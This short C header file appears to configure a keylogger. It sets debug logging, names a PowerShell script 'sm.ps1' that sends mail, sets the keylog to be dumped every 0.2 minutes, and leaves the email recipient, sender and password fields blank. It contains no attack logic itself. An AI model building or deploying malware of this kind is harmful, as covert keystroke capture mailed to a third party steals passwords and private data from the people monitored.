#pragma once

#ifndef SETTINGS_H
#define SETTINGS_H

/**
 * Whether or not to write debug logs
 **/
#define DEBUG true

/**
 * Name of powershell script used to send
 * mail
 **/
#define SCRIPT_NAME "sm.ps1"

/**
 * How often the keylog is dumped
 **/
#define FREQUENCY_MINUTES 0.2

/**
 * Login Credentials for email
 **/
#define X_EM_TO ""
#define X_EM_FROM ""
#define X_EM_PASS ""

#endif
